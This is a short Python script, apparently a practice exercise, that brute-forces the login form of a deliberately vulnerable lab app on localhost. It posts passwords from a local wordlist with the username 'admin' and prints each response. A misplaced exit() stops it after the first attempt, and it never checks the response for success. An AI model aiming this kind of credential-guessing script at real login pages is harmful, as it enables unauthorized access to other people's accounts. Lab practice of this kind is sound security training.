import requests
import re
line = "username or password"
URL="http://127.0.0.1/pikachu/vul/burteforce/bf_form.php"
data={"username":"admin","password":""}
with open("/mnt/home/CocRes/Password/pass.txt","r") as f:
    for i in f.readlines():
        data['password'] = i.split()
        print('密码：' + str(i.split()))
        res=requests.post(url=URL,data=data)
        res = res.content.decode("utf-8")
        print(res)
        exit()

